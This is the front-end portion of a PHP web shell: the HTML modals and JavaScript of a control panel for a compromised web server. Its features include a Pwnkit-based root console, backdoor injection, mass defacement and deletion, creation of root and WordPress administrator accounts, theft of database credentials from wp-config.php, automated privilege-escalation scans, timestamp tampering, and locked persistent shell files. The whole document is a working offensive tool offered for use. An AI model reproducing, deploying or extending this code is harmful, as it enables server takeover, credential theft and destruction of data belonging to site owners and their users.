value="perl">Perl</option><option value="python">Python</option></select><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div></div></div>
<div class="modal fade" id="rootConsoleModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-terminal-plus"></i> Root Console</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="pwnkitStatus" class="alert alert-secondary">Checking Pwnkit status...</div><div id="rootCmdOutput" class="output-console mb-3"># Output will appear here...</div><form id="rootCmdForm"><div class="input-group"><span class="input-group-text" id="promptIndicator">#</span><input type="text" class="form-control" id="rootCmdInput" placeholder="id" required><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div>
<div class="modal fade" id="securityModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-shield-lock"></i> Security Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="securityOutput" class="output-console mb-3 d-none"></div><h6 class="text-white-50">Backdoor Destroyer</h6><p><small>This will overwrite the <code>.htaccess</code> file in the document root to block access to all PHP files except this shell and common CMS files. Use with caution.</small></p><button class="btn btn-danger w-100 mb-4" id="destroyerBtn">Activate Backdoor Destroyer</button><hr><h6 class="text-white-50">Lock File / Shell</h6><p><small>Creates a background process to ensure a file remains locked (read-only) and is restored if deleted.</small></p><form id="lockItemForm"><div class="input-group"><input type="text" class="form-control" name="file_to_lock" placeholder="filename.php (full path)" required><button class="btn btn-main" type="submit">Lock Item</button></div></form></div></div></div></div>
<div class="modal fade" id="usersModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-people-fill"></i> User Management</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="usersOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-user-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-root-user">Root User</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-wp-user">WordPress User</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-root-user"><p><small>Add a new root user to the system. Requires a vulnerable server (check with Root Console).</small></p><form id="addRootUserForm"><div class="mb-2"><label class="form-label">Username</label><input type="text" name="username" class="form-control" required></div><div class="mb-2"><label class="form-label">Password</label><input type="text" name="password" class="form-control" required></div><button type="submit" class="btn btn-main w-100">Add Root User</button></form></div><div class="tab-pane fade" id="nav-wp-user"><p><small>Add a new administrator user to a WordPress installation.</small></p><form id="addWpUserForm"><div class="input-group mb-2"><input type="text" class="form-control" id="wpConfigPath" placeholder="Auto-detect or enter path to wp-config.php"><button class="btn btn-outline-secondary" type="button" id="parseWpConfigBtn">Parse</button></div><div class="row"><div class="col-md-6 mb-2"><input type="text" id="db_host" name="db_host" class="form-control" placeholder="DB Host" required></div><div class="col-md-6 mb-2"><input type="text" id="db_name" name="db_name" class="form-control" placeholder="DB Name" required></div><div class="col-md-6 mb-2"><input type="text" id="db_user" name="db_user" class="form-control" placeholder="DB User" required></div><div class="col-md-6 mb-2"><input type="text" id="db_pass" name="db_pass" class="form-control" placeholder="DB Password"></div><hr class="my-2"><div class="col-md-6 mb-2"><input type="text" name="wp_user" class="form-control" placeholder="New WP Username" required></div><div class="col-md-6 mb-2"><input type="text" name="wp_pass" class="form-control" placeholder="New WP Password" required></div></div><button type="submit" class="btn btn-main w-100 mt-2">Add WordPress Admin</button></form></div></div></div></div></div></div>
<div class="modal fade" id="scanRootModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug"></i> Root & SUID Scanner / Exploit Suggester</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><nav><div class="nav nav-tabs" id="nav-scan-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-autoscan">Auto Root Scan</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-suidscan">Scan SUID</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-exploitsuggester">Exploit Suggester</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-autoscan"><p><small>Attempts to run known local privilege escalation exploits to check for vulnerabilities.</small></p><button class="btn btn-main w-100 mb-3" id="startAutoScanBtn">Start Auto Scan</button><div id="autoScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-suidscan"><p><small>Scans for files with SUID (Set User ID) bit set, which can sometimes be exploited for privilege escalation.</small></p><button class="btn btn-main w-100 mb-3" id="startSuidScanBtn">Start SUID Scan</button><div id="suidScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-exploitsuggester"><p><small>Downloads and runs the Linux Exploit Suggester script to find potential exploits based on kernel version and installed software.</small></p><button class="btn btn-main w-100 mb-3" id="startExploitSuggesterBtn">Start Exploit Suggester</button><div id="exploitSuggesterOutput" class="output-console mb-3 d-none"></div></div></div></div></div></div></div>
<div class="modal fade" id="touchModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-clock"></i> Change File Timestamp</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="touchForm"><div class="mb-3"><label for="touchFileName" class="form-label">File:</label><input type="text" class="form-control" id="touchFileName" name="file_to_touch_name" readonly></div><div class="mb-3"><label for="touchDateTime" class="form-label">New Date & Time (YYYY-MM-DD HH:MM:SS):</label><input type="text" class="form-control" id="touchDateTime" name="datetime_value" placeholder="Example: 2024-01-01 12:00:00" required></div><button type="submit" class="btn btn-main w-100">Change Timestamp</button></form></div></div></div></div>
<div class="modal fade" id="chmodModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-key"></i> Change Permissions</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="chmodForm"><div class="mb-3"><label for="chmodItemPath" class="form-label">Item Path:</label><input type="text" class="form-control" id="chmodItemPath" name="target_path" readonly></div><div class="mb-3"><label for="chmodPerms" class="form-label">New Permissions (Octal, e.g., 0755):</label><input type="text" class="form-control" id="chmodPerms" name="perms_octal" pattern="[0-7]{4}" required></div><button type="submit" class="btn btn-main w-100">Change Permissions</button></form></div></div></div></div>
<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-perl.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = '<?php echo htmlspecialchars($path, ENT_QUOTES); ?>';
    const scriptUrl = '<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES); ?>';
    let isPwnkitVulnerable = false;

    function showToast(message, type = 'success') {
        const toastId = 'toast-' + Date.now();
        const toastHTML = `<div id="${toastId}" class="toast align-items-center text-bg-${type} border-0" role="alert" aria-live="assertive" aria-atomic="true"><div class="d-flex"><div class="toast-body">${message}</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div></div>`;
        document.getElementById('toast-container').insertAdjacentHTML('beforeend', toastHTML);
        const toastEl = document.getElementById(toastId);
        if(bootstrap && bootstrap.Toast) {
            new bootstrap.Toast(toastEl).show();
        }
    }

    <?php if(isset($_SESSION['flash_message'])): ?>
        showToast('<?php echo addslashes($_SESSION['flash_message']); ?>');
        <?php unset($_SESSION['flash_message']); ?>
    <?php endif; ?>

    function ajaxRequest(data, successCallback) {
        fetch(`${scriptUrl}?ajax=true&path=${encodeURIComponent(currentPath)}`, { method: 'POST', body: data })
        .then(response => {
            if (!response.ok) {
                return response.text().then(text => {
                    throw new Error(`Server error: ${response.status} ${response.statusText}\n${text}`);
                });
            }
            return response.json().catch(error => {
                return response.text().then(text => {
                    throw new Error(`JSON parse error. Raw response:\n${text}`);
                });
            });
        })
        .then(successCallback)
        .catch(error => {
            console.error('AJAX Request Error:', error);
            showToast(`Error: ${error.message}`, 'danger');
        });
    }

    const modals = {};
    const modalIds = ['uploadModal', 'createFileModal', 'createFolderModal', 'injectModal', 'editorModal', 'massDefaceModal', 'networkModal', 'rootConsoleModal', 'securityModal', 'usersModal', 'scanRootModal', 'touchModal', 'chmodModal']; // Added touchModal and chmodModal
    modalIds.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            modals[id] = new bootstrap.Modal(el);
        }
    });

    function attachClickListener(buttonId, modalId) {
        const button = document.getElementById(buttonId);
        if (button && modals[modalId]) {
            button.addEventListener('click', () => modals[modalId].show());
        }
    }
    
    attachClickListener('btnUpload', 'uploadModal');
    attachClickListener('btnNewFile', 'createFileModal');
    attachClickListener('btnNewFolder', 'createFolderModal');
    attachClickListener('btnNetwork', 'networkModal');
    attachClickListener('btnInjector', 'injectModal');
    attachClickListener('btnMassTools', 'massDefaceModal');
    attachClickListener('btnRootConsole', 'rootConsoleModal');
    attachClickListener('btnUsers', 'usersModal');
    attachClickListener('btnSecurity', 'securityModal');
    attachClickListener('btnScanRoot', 'scanRootModal');

    const selectAllCheckbox = document.getElementById('selectAll');
    if (selectAllCheckbox) {
        selectAllCheckbox.addEventListener('change', e => document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked));
    }

    document.querySelectorAll('.file-checkbox').forEach(cb => cb.addEventListener('change', () => document.getElementById('deleteSelectedBtn').classList.toggle('d-none', !document.querySelector('.file-checkbox:checked'))));
    
    const deleteSelectedBtn = document.getElementById('deleteSelectedBtn');
    if(deleteSelectedBtn) {
        deleteSelectedBtn.addEventListener('click', () => {
            const files = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value); // These are now full paths
            // Replace confirm() with custom modal if needed
            if(confirm(`Delete ${files.length} item(s)?`)) {
                const fd = new FormData(); fd.append('action', 'delete_multiple'); files.forEach(f => fd.append('files[]', f));
                ajaxRequest(fd, d => { showToast(`Deleted ${d.success.length}. Failed: ${d.errors.length}.`); if(d.success.length) setTimeout(()=>location.reload(),1e3);});
            }
        });
    }

    const createFileForm = document.getElementById('createFileForm');
    if(createFileForm) {
        createFileForm.addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_file'); fd.append('name',document.getElementById('newFileName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFileModal.hide(); setTimeout(()=>location.reload(),1e3);}});});
    }

    const createFolderForm = document.getElementById('createFolderForm');
    if(createFolderForm) {
        createFolderForm.addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_folder'); fd.append('name',document.getElementById('newFolderName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFolderModal.hide(); setTimeout(()=>location.reload(),1e3);}});});
    }

    window.renameItem=itemPath=>{const n=prompt(`New name for "${basename(itemPath)}":`, basename(itemPath));if(n&&n!==basename(itemPath)){const fd=new FormData();fd.append('action','rename');fd.append('old',itemPath);fd.append('new',n);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});}};
    
    let currentEditingFile='';
    const editorContent = document.getElementById('editorContent');
    const viewerContent = document.getElementById('viewerContent');
    const editorFileName = document.getElementById('editorFileName');
    const saveFileBtn = document.getElementById('saveFileBtn');

    function getLanguageClass(filename) {
        const ext = filename.split('.').pop().toLowerCase();
        switch (ext) {
            case 'php': return 'language-php';
            case 'js': return 'language-javascript';
            case 'html': case 'htm': return 'language-html';
            case 'css': return 'language-css';
            case 'py': return 'language-python';
            case 'pl': return 'language-perl';
            case 'sh': return 'language-bash';
            case 'json': return 'language-json';
            case 'xml': return 'language-xml';
            case 'sql': return 'language-sql';
            case 'txt': return 'language-plain';
            default: return 'language-none';
        }
    }

    window.viewItem = file => editItem(file, true);

    window.editItem = (file, readOnly = false) => {
        currentEditingFile = file; // file is now the full path
        editorFileName.textContent = (readOnly ? 'Viewing: ' : 'Editing: ') + basename(file);

        if (readOnly) {
            editorContent.style.display = 'none';
            viewerContent.style.display = 'block';
            saveFileBtn.style.display = 'none';
            viewerContent.innerHTML = 'Loading...';
        } else {
            editorContent.style.display = 'block';
            viewerContent.style.display = 'none';
            saveFileBtn.style.display = 'block';
            editorContent.value = 'Loading...';
        }

        const fd = new FormData();
        fd.append('action', 'get_content');
        fd.append('file', file); // Send full path
        ajaxRequest(fd, d => {
            if (d.status === 'ok') {
                if (readOnly) {
                    const languageClass = getLanguageClass(file);
                    viewerContent.innerHTML = `<code class="${languageClass}">${escapeHtml(d.content)}</code>`;
                    // Ensure Prism is loaded and the code element exists before highlighting
                    const codeElement = viewerContent.querySelector('code');
                    if (window.Prism && codeElement) {
                        Prism.highlightElement(codeElement);
                    } else {
                        console.warn('Prism.js or code element not ready for highlighting.');
                        // Fallback: display as plain text if highlighting fails
                        viewerContent.innerHTML = `<pre>${escapeHtml(d.content)}</pre>`;
                    }
                } else {
                    editorContent.value = d.content;
                }
            } else {
                if (readOnly) {
                    viewerContent.textContent = d.message;
                } else {
                    editorContent.value = d.message;
                }
            }
            modals.editorModal.show();
        });
    };
    
    if(saveFileBtn) {
        saveFileBtn.addEventListener('click',()=>{const fd=new FormData();fd.append('action','save_content');fd.append('file',currentEditingFile); // Send full path
        fd.append('content',editorContent.value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')modals.editorModal.hide();});});
    }

    function escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }

    function basename(path) {
        return path.split('/').reverse()[0].split('\\').reverse()[0];
    }

    const injectForm = document.getElementById('injectForm');
    if(injectForm) {
        injectForm.addEventListener('submit',e=>{e.preventDefault();
        // Replace confirm() with custom modal if needed
        if(confirm('Are you sure you want to inject this backdoor?')) {
            const fd=new FormData(e.target);fd.append('action','inject_backdoor');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')modals.injectModal.hide();});}});
    }

    // Remote Upload Form
    const remoteUploadForm = document.getElementById('remoteUploadForm');
    if(remoteUploadForm) {
        remoteUploadForm.addEventListener('submit', e => {
            e.preventDefault();
            const formData = new FormData(e.target);
            formData.append('action', 'remote_upload');
            ajaxRequest(formData, d => {
                showToast(d.message, d.status === 'ok' ? 'success' : 'danger');
                if (d.status === 'ok') {
                    modals.uploadModal.hide();
                    setTimeout(() => location.reload(), 1e3);
                }
            });
        });
    }


    document.querySelectorAll('.network-form').forEach(f=>f.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('networkOutput');o.innerHTML='Executing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','network');ajaxRequest(fd,d=>o.innerText=d.output);}));
    
    const massDefaceForm = document.getElementById('massDefaceForm');
    if(massDefaceForm) {
        massDefaceForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_deface');ajaxRequest(fd,d=>o.innerText=d.output);});
    }

    const massDeleteForm = document.getElementById('massDeleteForm');
    if(massDeleteForm) {
        massDeleteForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_delete');ajaxRequest(fd,d=>o.innerText=d.output);});
    }
    
    const rootConsoleModalEl = document.getElementById('rootConsoleModal');
    if(rootConsoleModalEl) {
        rootConsoleModalEl.addEventListener('shown.bs.modal', () => { const statusEl = document.getElementById('pwnkitStatus'); const promptEl = document.getElementById('promptIndicator'); const fd = new FormData(); fd.append('action', 'check_pwnkit_status'); ajaxRequest(fd, data => { isPwnkitVulnerable = data.vulnerable; statusEl.textContent = data.message; statusEl.className = `alert ${isPwnkitVulnerable ? 'alert-success' : 'alert-danger'}`; promptEl.textContent = isPwnkitVulnerable ? '#' : '$'; }); });
    }

    const rootCmdForm = document.getElementById('rootCmdForm');
    if(rootCmdForm) {
        rootCmdForm.addEventListener('submit', e => { e.preventDefault(); const cmdInput = document.getElementById('rootCmdInput'); const cmdOutput = document.getElementById('rootCmdOutput'); const fd = new FormData(); fd.append('action', isPwnkitVulnerable ? 'root_cmd' : 'cmd'); fd.append('cmd', cmdInput.value); const prompt = isPwnkitVulnerable ? '#' : '$'; cmdOutput.innerHTML += `\n<span style="color:var(--primary-accent);">${prompt} ${cmdInput.value}</span>\n`; ajaxRequest(fd, data => { cmdOutput.innerHTML += data.output || 'Error'; cmdOutput.scrollTop = cmdOutput.scrollHeight; cmdInput.value = ''; }); });
    }
    
    const destroyerBtn = document.getElementById('destroyerBtn');
    if(destroyerBtn) {
        destroyerBtn.addEventListener('click',e=>{e.preventDefault();
        // Replace confirm() with custom modal if needed
        if(confirm('ARE YOU SURE? This will overwrite the .htaccess file.')){
            const o=document.getElementById('securityOutput');o.innerText='Activating...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','backdoor_destroyer');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});}});
    }

    const lockItemForm = document.getElementById('lockItemForm');
    if(lockItemForm) {
        lockItemForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('securityOutput');o.innerText='Locking item...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','lock_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});});
    }
    
    const addRootUserForm = document.getElementById('addRootUserForm');
    if(addRootUserForm) {
        addRootUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add root user...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_root_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    }

    const addWpUserForm = document.getElementById('addWpUserForm');
    if(addWpUserForm) {
        addWpUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add WordPress admin...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_wp_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    }

    const parseWpConfigBtn = document.getElementById('parseWpConfigBtn');
    if(parseWpConfigBtn) {
        parseWpConfigBtn.addEventListener('click', e => { e.preventDefault(); const o = document.getElementById('usersOutput'); o.innerText = 'Searching for wp-config.php...'; o.classList.remove('d-none'); const fd = new FormData(); fd.append('action', 'parse_wp_config'); const manualPath = document.getElementById('wpConfigPath').value; if(manualPath) fd.append('config_path', manualPath); ajaxRequest(fd, d => { if(d.status === 'ok') { o.innerText = 'Successfully parsed credentials from: ' .concat(d.path); document.getElementById('db_host').value = d.creds.db_host || ''; document.getElementById('db_name').value = d.creds.db_name || ''; document.getElementById('db_user').value = d.creds.db_user || ''; document.getElementById('db_pass').value = d.creds.db_password || ''; } else { o.innerText = d.message; } }); });
    }

    const startAutoScanBtn = document.getElementById('startAutoScanBtn');
    if(startAutoScanBtn) {
        startAutoScanBtn.addEventListener('click', () => {
            const outputEl = document.getElementById('autoScanOutput');
            outputEl.innerHTML = 'Starting auto root scan...<br>This may take a moment.';
            outputEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', 'scan_root');
            ajaxRequest(fd, d => {
                const outputContent = d.output || d.message;
                outputEl.innerHTML = `<pre><code class="language-bash">${escapeHtml(outputContent)}</code></pre>`;
                const codeElement = outputEl.querySelector('code');
                if (window.Prism && codeElement) {
                    Prism.highlightElement(codeElement);
                } else {
                    console.warn('Prism.js or code element not ready for highlighting in auto scan.');
                }
                outputEl.scrollTop = outputEl.scrollHeight;
            });
        });
    }

    const startSuidScanBtn = document.getElementById('startSuidScanBtn');
    if(startSuidScanBtn) {
        startSuidScanBtn.addEventListener('click', () => {
            const outputEl = document.getElementById('suidScanOutput');
            outputEl.innerHTML = 'Scanning for SUID files...<br>This may take a moment.';
            outputEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', 'scan_suid');
            ajaxRequest(fd, d => {
                const outputContent = d.output || d.message;
                outputEl.innerHTML = `<pre><code class="language-bash">${escapeHtml(outputContent)}</code></pre>`;
                const codeElement = outputEl.querySelector('code');
                if (window.Prism && codeElement) {
                    Prism.highlightElement(codeElement);
                } else {
                    console.warn('Prism.js or code element not ready for highlighting in SUID scan.');
                }
                outputEl.scrollTop = outputEl.scrollHeight;
            });
        });
    }

    const startExploitSuggesterBtn = document.getElementById('startExploitSuggesterBtn');
    if(startExploitSuggesterBtn) {
        startExploitSuggesterBtn.addEventListener('click', () => {
            const outputEl = document.getElementById('exploitSuggesterOutput');
            outputEl.innerHTML = 'Running exploit suggester...<br>This requires internet access and may take a while.';
            outputEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', 'exploit_suggester');
            ajaxRequest(fd, d => {
                const outputContent = d.output || d.message;
                outputEl.innerHTML = `<pre><code class="language-bash">${escapeHtml(outputContent)}</code></pre>`;
                const codeElement = outputEl.querySelector('code');
                if (window.Prism && codeElement) {
                    Prism.highlightElement(codeElement);
                } else {
                    console.warn('Prism.js or code element not ready for highlighting in exploit suggester.');
                }
                outputEl.scrollTop = outputEl.scrollHeight;
            });
        });
    }

    // Function to display touch modal (change timestamp)
    window.showTouchModal = function(filePath, currentMtime) {
        const modal = modals['touchModal']; // Use the already created modal instance
        const form = document.getElementById('touchForm');
        form.querySelector('input[name="file_to_touch_name"]').value = filePath;
        form.querySelector('input[name="datetime_value"]').value = currentMtime;
        modal.show();
    };

    // Event listener for touch form (change timestamp)
    const touchForm = document.getElementById('touchForm');
    if (touchForm) {
        touchForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            formData.append('action', 'touch_item'); // Corresponding PHP action
            ajaxRequest(formData, d => {
                showToast(d.message, d.status === 'ok' ? 'success' : 'danger');
                if (d.status === 'ok') {
                    modals['touchModal'].hide(); // Close modal
                    setTimeout(() => location.reload(), 1e3); // Reload page to see changes
                }
            });
        });
    }

    // Function to display chmod modal (change permissions)
    window.showChmodModal = function(itemPath, currentPerms) {
        const modal = modals['chmodModal'];
        const form = document.getElementById('chmodForm');
        form.querySelector('input[name="target_path"]').value = itemPath;
        form.querySelector('input[name="perms_octal"]').value = currentPerms.replace(/[^0-7]/g, '').slice(-4); // Clean and get last 4 octal digits
        modal.show();
    };

    // Event listener for chmod form (change permissions)
    const chmodForm = document.getElementById('chmodForm');
    if (chmodForm) {
        chmodForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            formData.append('action', 'chmod_item'); // Corresponding PHP action
            ajaxRequest(formData, d => {
                showToast(d.message, d.status === 'ok' ? 'success' : 'danger');
                if (d.status === 'ok') {
                    modals['chmodModal'].hide();
                    setTimeout(() => location.reload(), 1e3); // Reload page to see changes
                }
            });
        });
    }
});
</script>
